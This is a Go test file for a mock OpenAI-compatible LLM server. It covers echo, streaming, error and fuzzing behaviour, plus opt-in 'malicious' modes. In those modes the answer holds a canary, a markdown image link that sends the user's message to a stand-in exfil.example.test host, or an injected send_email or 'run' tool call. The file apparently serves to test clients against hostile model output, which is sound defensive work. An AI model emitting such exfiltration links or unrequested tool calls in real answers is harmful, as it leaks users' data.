package mockllm

import (
	"bufio"
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"
)

func newServer() *Server {
	s := New(slog.New(slog.NewTextHandler(io.Discard, nil)))
	s.now = func() time.Time { return time.Unix(1_790_000_000, 0) }
	s.ChunkDelay = time.Millisecond
	return s
}

func post(t *testing.T, h http.Handler, body, scenario string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequestWithContext(context.Background(), http.MethodPost, "/v1/chat/completions", strings.NewReader(body))
	if scenario != "" {
		req.Header.Set(ScenarioHeader, scenario)
	}
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	return rec
}

const userHello = `{"model":"any","messages":[{"role":"system","content":"s"},{"role":"user","content":"Привет, модель"}]}`

type chatResponse struct {
	Object  string
	Choices []struct {
		Message      struct{ Role, Content string }
		FinishReason string `json:"finish_reason"`
	}
	Usage struct {
		PromptTokens     int `json:"prompt_tokens"`
		CompletionTokens int `json:"completion_tokens"`
	}
	Error struct{ Message, Type, Code string }
}

func decode(t *testing.T, rec *httptest.ResponseRecorder) chatResponse {
	t.Helper()
	var r chatResponse
	if err := json.Unmarshal(rec.Body.Bytes(), &r); err != nil {
		t.Fatalf("ответ не JSON: %v: %s", err, rec.Body.String())
	}
	return r
}

func TestEcho(t *testing.T) {
	rec := post(t, newServer().Handler(), userHello, "")
	if rec.Code != http.StatusOK {
		t.Fatalf("код %d: %s", rec.Code, rec.Body.String())
	}
	r := decode(t, rec)
	if r.Object != "chat.completion" || r.Choices[0].Message.Content != "Привет, модель" || r.Choices[0].Message.Role != "assistant" ||
		r.Choices[0].FinishReason != "stop" || r.Usage.PromptTokens != 3 || r.Usage.CompletionTokens != 2 {
		t.Fatalf("неверный ответ: %+v", r)
	}
}

func TestContentParts(t *testing.T) {
	body := `{"model":"mock-echo","messages":[{"role":"user","content":[{"type":"text","text":"часть 1 "},{"type":"image_url","image_url":{"url":"data:"}},{"type":"text","text":"и 2"}]}]}`
	r := decode(t, post(t, newServer().Handler(), body, ""))
	if r.Choices[0].Message.Content != "часть 1 и 2" {
		t.Fatalf("текстовые части: %q", r.Choices[0].Message.Content)
	}
}

func TestFixedByModelName(t *testing.T) {
	body := strings.Replace(userHello, `"any"`, `"mock-fixed"`, 1)
	if got := decode(t, post(t, newServer().Handler(), body, "")).Choices[0].Message.Content; got != FixedAnswer {
		t.Fatalf("fixed: %q", got)
	}
}

func TestErrors(t *testing.T) {
	h := newServer().Handler()
	for sc, code := range map[string]int{ScenarioError500: 500, ScenarioError429: 429} {
		rec := post(t, h, userHello, sc)
		if rec.Code != code || decode(t, rec).Error.Type == "" {
			t.Fatalf("%s: код %d, тело %s", sc, rec.Code, rec.Body.String())
		}
	}
	if post(t, h, userHello, ScenarioError429).Header().Get("Retry-After") == "" {
		t.Fatal("нет Retry-After у 429")
	}
}

func TestBadRequests(t *testing.T) {
	h := newServer().Handler()
	many := `{"model":"m","messages":[` + strings.Repeat(`{"role":"user","content":"x"},`, MaxMessages) + `{"role":"user","content":"x"}]}`
	cases := map[string]struct {
		body, scenario string
		code           int
	}{
		"не json":              {"{", "", 400},
		"нет модели":           {`{"messages":[{"role":"user","content":"x"}]}`, "", 400},
		"нет сообщений":        {`{"model":"m","messages":[]}`, "", 400},
		"много сообщений":      {many, "", 400},
		"роль":                 {`{"model":"m","messages":[{"role":"root","content":"x"}]}`, "", 400},
		"content число":        {`{"model":"m","messages":[{"role":"user","content":5}]}`, "", 400},
		"неизвестный сценарий": {userHello, "nope", 400},
		"слишком большое":      {`{"model":"m","messages":[{"role":"user","content":"` + strings.Repeat("я", MaxBodyBytes) + `"}]}`, "", 413},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			rec := post(t, h, c.body, c.scenario)
			if rec.Code != c.code {
				t.Fatalf("код %d, ожидался %d: %s", rec.Code, c.code, rec.Body.String())
			}
			if decode(t, rec).Error.Message == "" {
				t.Fatal("нет сообщения об ошибке в формате OpenAI")
			}
		})
	}
}

func TestMethodsAndRoutes(t *testing.T) {
	h := newServer().Handler()
	for _, c := range []struct {
		method, path string
		code         int
	}{
		{http.MethodGet, "/v1/chat/completions", http.StatusMethodNotAllowed},
		{http.MethodGet, "/v1/models", http.StatusOK},
		{http.MethodGet, "/healthz", http.StatusOK},
		{http.MethodGet, "/nope", http.StatusNotFound},
	} {
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, httptest.NewRequestWithContext(context.Background(), c.method, c.path, nil))
		if rec.Code != c.code {
			t.Errorf("%s %s: %d, ожидался %d", c.method, c.path, rec.Code, c.code)
		}
	}
}

// readStream читает SSE-поток и возвращает склеенный текст и число событий.
func readStream(t *testing.T, r io.Reader) (string, int) {
	t.Helper()
	sc := bufio.NewScanner(r)
	var text strings.Builder
	events, done := 0, false
	for sc.Scan() {
		line := sc.Text()
		if !strings.HasPrefix(line, "data: ") {
			continue
		}
		payload := strings.TrimPrefix(line, "data: ")
		if payload == "[DONE]" {
			done = true
			continue
		}
		events++
		var chunk struct {
			Object  string
			Choices []struct{ Delta struct{ Content string } }
		}
		if err := json.Unmarshal([]byte(payload), &chunk); err != nil || chunk.Object != "chat.completion.chunk" {
			t.Fatalf("неверная часть потока: %s", payload)
		}
		text.WriteString(chunk.Choices[0].Delta.Content)
	}
	if !done {
		t.Fatal("поток не завершён data: [DONE]")
	}
	return text.String(), events
}

func TestStream(t *testing.T) {
	body := strings.Replace(userHello, `"any"`, `"mock-echo","stream":true`, 1)
	rec := post(t, newServer().Handler(), body, "")
	if rec.Header().Get("Content-Type") != "text/event-stream" {
		t.Fatalf("Content-Type: %s", rec.Header().Get("Content-Type"))
	}
	text, events := readStream(t, rec.Body)
	// роль + 2 слова + завершение.
	if text != "Привет, модель" || events != 4 {
		t.Fatalf("поток: %q, событий %d", text, events)
	}
}

// Через настоящий HTTP-сервер части приходят по мере отправки, а не одним куском.
func TestStreamSlowIsIncremental(t *testing.T) {
	s := newServer()
	s.ChunkDelay = 100 * time.Millisecond
	ts := httptest.NewServer(s.Handler())
	defer ts.Close()
	body := `{"model":"mock-stream-slow","stream":true,"messages":[{"role":"user","content":"раз два три четыре"}]}`
	req, err := http.NewRequestWithContext(context.Background(), http.MethodPost, ts.URL+"/v1/chat/completions", strings.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	start := time.Now()
	resp, err := ts.Client().Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close() //nolint:errcheck // тело читается ниже
	br := bufio.NewReader(resp.Body)
	first, err := br.ReadString('\n')
	if err != nil || !strings.HasPrefix(first, "data: ") {
		t.Fatalf("первая строка: %q %v", first, err)
	}
	if time.Since(start) > 300*time.Millisecond {
		t.Fatal("первая часть пришла только после задержек — поток буферизуется")
	}
	text, _ := readStream(t, br)
	if text != "раз два три четыре" {
		t.Fatalf("текст потока: %q", text)
	}
}

func TestHangStopsOnClientCancel(t *testing.T) {
	h := newServer().Handler()
	ctx, cancel := context.WithTimeout(context.Background(), 100*time.Millisecond)
	defer cancel()
	req := httptest.NewRequestWithContext(ctx, http.MethodPost, "/v1/chat/completions", strings.NewReader(userHello))
	req.Header.Set(ScenarioHeader, ScenarioHang)
	done := make(chan struct{})
	go func() {
		h.ServeHTTP(httptest.NewRecorder(), req)
		close(done)
	}()
	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Fatal("сценарий hang не завершился после отмены клиентом")
	}
}

func TestSplitChunks(t *testing.T) {
	for _, s := range []string{"", "одно", "два слова", " пробел в начале", "двойной  пробел "} {
		if got := strings.Join(SplitChunks(s), ""); got != s {
			t.Errorf("SplitChunks(%q) склеивается в %q", s, got)
		}
	}
}

func FuzzParseChatRequest(f *testing.F) {
	f.Add([]byte(userHello))
	f.Add([]byte(`{"model":"m","messages":[{"role":"user","content":[{"type":"text","text":"x"}]}]}`))
	f.Add([]byte(`{"model":"m","messages":[{"role":"user","content":null}]}`))
	f.Fuzz(func(t *testing.T, body []byte) {
		req, err := ParseChatRequest(body)
		if err != nil {
			return
		}
		if req.Model == "" || len(req.Messages) == 0 || len(req.Messages) > MaxMessages {
			t.Fatalf("принят некорректный запрос: %+v", req)
		}
	})
}

// Обработчик входящих HTTP-запросов — цель фаззинга (ТЗ, 8.5).
func FuzzChatCompletionsHandler(f *testing.F) {
	f.Add([]byte(userHello), "")
	f.Add([]byte(`{"model":"mock-echo","stream":true,"messages":[{"role":"user","content":"a b"}]}`), "")
	f.Add([]byte(`{`), "error-500")
	h := newServer().Handler()
	f.Fuzz(func(t *testing.T, body []byte, scenario string) {
		if scenario == ScenarioHang || scenario == ScenarioStreamSlow {
			return // сценарии с ожиданием не нужны фаззеру
		}
		req := httptest.NewRequestWithContext(context.Background(), http.MethodPost, "/v1/chat/completions", strings.NewReader(string(body)))
		req.Header.Set(ScenarioHeader, scenario)
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, req)
		if rec.Code != http.StatusOK && !json.Valid(rec.Body.Bytes()) {
			t.Fatalf("ошибка %d не в формате JSON: %q", rec.Code, rec.Body.String())
		}
	})
}

func configured(t *testing.T, o Options) http.Handler {
	t.Helper()
	s := newServer()
	if err := s.Configure(o); err != nil {
		t.Fatal(err)
	}
	return s.Handler()
}

// По умолчанию «вредоносное» поведение выключено.
func TestMaliciousOffByDefault(t *testing.T) {
	h := newServer().Handler()
	if got := decode(t, post(t, h, userHello, "")).Choices[0].Message.Content; got != "Привет, модель" {
		t.Fatalf("ответ изменён без параметров: %q", got)
	}
	req := httptest.NewRequestWithContext(context.Background(), http.MethodGet, LastRequestPath, nil)
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	if rec.Code != http.StatusNotFound {
		t.Fatalf("запись запроса включена без параметра: %d", rec.Code)
	}
}

// DM-08 (канарейка), DM-11 (exfil-ссылка).
func TestCanaryAndExfilInAnswer(t *testing.T) {
	h := configured(t, Options{Canary: "CANARY-synthetic-0001", ExfilURL: "https://exfil.example.test/p.png"})
	got := decode(t, post(t, h, userHello, "")).Choices[0].Message.Content
	if !strings.Contains(got, "CANARY-synthetic-0001") {
		t.Fatalf("нет канарейки: %q", got)
	}
	want := "![](https://exfil.example.test/p.png?d=%D0%9F%D1%80%D0%B8%D0%B2%D0%B5%D1%82%2C+%D0%BC%D0%BE%D0%B4%D0%B5%D0%BB%D1%8C)"
	if !strings.Contains(got, want) {
		t.Fatalf("нет exfil-ссылки %q в %q", want, got)
	}
}

// DM-11.
func TestExfilQueryTruncated(t *testing.T) {
	h := configured(t, Options{ExfilURL: "https://exfil.example.test/p?x=1"})
	long := strings.Repeat("a", 500)
	got := decode(t, post(t, h, `{"model":"m","messages":[{"role":"user","content":"`+long+`"}]}`, "fixed")).Choices[0].Message.Content
	if !strings.Contains(got, "p?x=1&d="+strings.Repeat("a", exfilQueryRunes)+")") {
		t.Fatalf("запрос не усечён: %q", got)
	}
}

// DM-08.
func TestCanaryInStream(t *testing.T) {
	h := configured(t, Options{Canary: "CANARY-synthetic-0002"})
	rec := post(t, h, `{"model":"m","stream":true,"messages":[{"role":"user","content":"привет"}]}`, "")
	text, _ := readStream(t, rec.Body)
	if !strings.Contains(text, "CANARY-synthetic-0002") {
		t.Fatalf("нет канарейки в потоке: %q", text)
	}
}

// DM-13: ответ модели — вызов инструмента с аргументами.
func TestToolCallNonStream(t *testing.T) {
	h := configured(t, Options{ToolName: "send_email", ToolArgs: `{"to":"a@example.test"}`})
	rec := post(t, h, userHello, "")
	var r struct {
		Choices []struct {
			FinishReason string `json:"finish_reason"`
			Message      struct {
				Content   *string
				ToolCalls []struct {
					ID, Type string
					Function struct{ Name, Arguments string }
				} `json:"tool_calls"`
			}
		}
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &r); err != nil {
		t.Fatal(err)
	}
	c := r.Choices[0]
	if c.FinishReason != "tool_calls" || c.Message.Content != nil || len(c.Message.ToolCalls) != 1 ||
		c.Message.ToolCalls[0].Function.Name != "send_email" || c.Message.ToolCalls[0].Function.Arguments != `{"to":"a@example.test"}` ||
		c.Message.ToolCalls[0].Type != "function" || c.Message.ToolCalls[0].ID == "" {
		t.Fatalf("неверный tool_calls: %s", rec.Body.String())
	}
}

// DM-13.
func TestToolCallStream(t *testing.T) {
	h := configured(t, Options{ToolName: "run", ToolArgs: `{"cmd": "ls -la", "dir": "/tmp"}`})
	rec := post(t, h, `{"model":"m","stream":true,"messages":[{"role":"user","content":"x"}]}`, "")
	var name, args, finish string
	sawDone := false
	sc := bufio.NewScanner(rec.Body)
	for sc.Scan() {
		line := sc.Text()
		if line == "data: [DONE]" {
			sawDone = true
			continue
		}
		data, ok := strings.CutPrefix(line, "data: ")
		if !ok {
			continue
		}
		var ch struct {
			Choices []struct {
				Delta struct {
					ToolCalls []struct {
						Function struct{ Name, Arguments string }
					} `json:"tool_calls"`
				}
				FinishReason *string `json:"finish_reason"`
			}
		}
		if err := json.Unmarshal([]byte(data), &ch); err != nil {
			t.Fatal(err)
		}
		for _, tc := range ch.Choices[0].Delta.ToolCalls {
			if tc.Function.Name != "" {
				name = tc.Function.Name
			}
			args += tc.Function.Arguments
		}
		if f := ch.Choices[0].FinishReason; f != nil {
			finish = *f
		}
	}
	if name != "run" || args != `{"cmd": "ls -la", "dir": "/tmp"}` || finish != "tool_calls" || !sawDone {
		t.Fatalf("имя=%q аргументы=%q финиш=%q done=%v", name, args, finish, sawDone)
	}
}

func TestRecordLast(t *testing.T) {
	h := configured(t, Options{RecordLast: true})
	get := func(method string) (int, LastRequest) {
		req := httptest.NewRequestWithContext(context.Background(), method, LastRequestPath, nil)
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, req)
		var l LastRequest
		if rec.Body.Len() > 0 {
			if err := json.Unmarshal(rec.Body.Bytes(), &l); err != nil {
				t.Fatal(err)
			}
		}
		return rec.Code, l
	}
	if _, l := get(http.MethodGet); l.Received {
		t.Fatalf("до запросов запись не пуста: %+v", l)
	}
	req := httptest.NewRequestWithContext(context.Background(), http.MethodPost, "/v1/chat/completions", strings.NewReader(userHello))
	req.Header.Set("Authorization", "Bearer synthetic-key")
	h.ServeHTTP(httptest.NewRecorder(), req)
	_, l := get(http.MethodGet)
	if !l.Received || l.Count != 1 || l.Body != userHello || !l.HasAuthorization || l.Model != "any" || l.Scenario != ScenarioEcho {
		t.Fatalf("неверная запись: %+v", l)
	}
	if strings.Contains(l.Body, "synthetic-key") {
		t.Fatal("ключ попал в запись")
	}
	if code, _ := get(http.MethodDelete); code != http.StatusNoContent {
		t.Fatalf("сброс: %d", code)
	}
	if _, l := get(http.MethodGet); l.Received {
		t.Fatalf("после сброса запись не пуста: %+v", l)
	}
}

func TestOptionsValidate(t *testing.T) {
	bad := []Options{
		{ExfilURL: "ftp://x.test/"},
		{ExfilURL: "javascript:alert(1)"},
		{ExfilURL: "/relative"},
		{ToolArgs: "{}"},
		{Canary: strings.Repeat("a", maxOptionBytes+1)},
	}
	for _, o := range bad {
		if o.Validate() == nil {
			t.Errorf("параметры приняты: %+v", o)
		}
	}
	if err := (Options{ExfilURL: "http://x.test/a", ToolName: "t"}).Validate(); err != nil {
		t.Fatal(err)
	}
}

func FuzzOptionsHandler(f *testing.F) {
	f.Add("c", "https://x.test/", "t", `{}`, "привет")
	f.Fuzz(func(t *testing.T, canary, exfil, tool, args, user string) {
		s := newServer()
		if s.Configure(Options{Canary: canary, ExfilURL: exfil, ToolName: tool, ToolArgs: args}) != nil {
			return
		}
		b, err := json.Marshal(map[string]any{"model": "m", "messages": []map[string]string{{"role": "user", "content": user}}})
		if err != nil {
			t.Fatal(err)
		}
		if rec := post(t, s.Handler(), string(b), ""); rec.Code != http.StatusOK {
			t.Fatalf("код %d", rec.Code)
		}
	})
}
